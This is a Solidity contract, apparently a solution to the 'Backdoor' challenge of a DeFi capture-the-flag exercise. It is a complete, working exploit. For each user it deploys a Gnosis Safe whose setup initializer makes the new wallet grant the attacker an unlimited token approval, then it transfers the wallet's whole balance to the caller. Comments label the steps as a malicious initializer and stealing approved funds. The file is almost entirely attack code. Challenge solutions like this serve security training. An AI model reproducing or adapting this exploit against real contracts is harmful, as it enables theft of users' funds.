// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../backdoor/WalletRegistry.sol";

import "hardhat/console.sol";

contract AttackerBackdoor {
    WalletRegistry private immutable walletRegistry;
    GnosisSafeProxyFactory private immutable factory;
    GnosisSafe private immutable masterCopy;
    IERC20 private immutable token;

    constructor(address _walletRegistry) {
        // Set state variables
        walletRegistry = WalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        factory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        token = IERC20(walletRegistry.token());
    }

    function attack(address[] memory users) external {
        // Create a new safe through the factory for every user
        bytes memory initializer;
        address[] memory owners = new address[](1);
        address wallet;

        for (uint256 i; i < users.length; i++) {
            owners[0] = users[i];
            initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners,
                    1,
                    address(this),
                    abi.encodeCall(this.maliciousApprove, (token, address(this))), // @note malicious initializer
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            wallet = address(factory.createProxyWithCallback(address(masterCopy), initializer, 0, walletRegistry));

            console.log("Allowance", IERC20(token).allowance(wallet, address(this)));
            console.log("Balance", IERC20(token).balanceOf(wallet));
            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet)); // @note steal approved funds
        }
    }

    function maliciousApprove(IERC20 _token, address _attacker) public {
        _token.approve(_attacker, type(uint256).max);
    }
}
